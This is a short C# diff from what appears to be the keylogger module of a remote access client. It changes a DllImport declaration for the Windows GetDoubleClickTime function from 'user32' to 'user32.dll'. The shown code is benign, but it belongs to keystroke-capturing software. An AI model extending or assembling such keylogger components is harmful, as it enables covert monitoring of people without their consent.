@@ -21,7 +21,7 @@ namespace xClient.Core.Keylogger.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/en-us/library/ms646258(VS.85).aspx
         /// </remarks>
-        [DllImport("user32")]
+        [DllImport("user32.dll")]
         internal static extern int GetDoubleClickTime();
     }
 }
